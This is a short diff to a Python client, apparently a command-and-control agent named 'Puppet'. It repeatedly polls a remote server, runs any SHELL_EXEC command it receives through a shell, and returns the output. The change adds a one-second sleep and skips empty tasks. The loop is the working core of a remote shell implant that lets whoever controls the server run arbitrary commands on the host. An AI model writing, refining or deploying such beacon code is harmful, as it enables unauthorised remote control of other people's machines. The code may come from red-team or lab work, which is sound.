@@ -3,6 +3,7 @@ import os
 import sys
 from subprocess import getoutput as execute
 from uuid import uuid4
+from time import sleep
 
 from requests import Session
 from urllib3 import disable_warnings
@@ -87,12 +88,15 @@ server_base_url = f"https://{options.server_address}:{options.server_port}"
 puppet = Puppet(server_base_url=server_base_url)
 while True:
     try:
+        sleep(1)
         task = puppet.get_command()
-
-        # understand what needs to be done
-        if task['task'] == 'SHELL_EXEC':
-            cmd = task['command']
-            output = puppet.execute_command(command=cmd)
-            puppet.send_output(puppet_message=output)
+        if not task:
+            continue
+        else:
+            # understand what needs to be done
+            if task['task'] == 'SHELL_EXEC':
+                cmd = task['command']
+                output = puppet.execute_command(command=cmd)
+                puppet.send_output(puppet_message=output)
     except Exception as e:
         print(e)
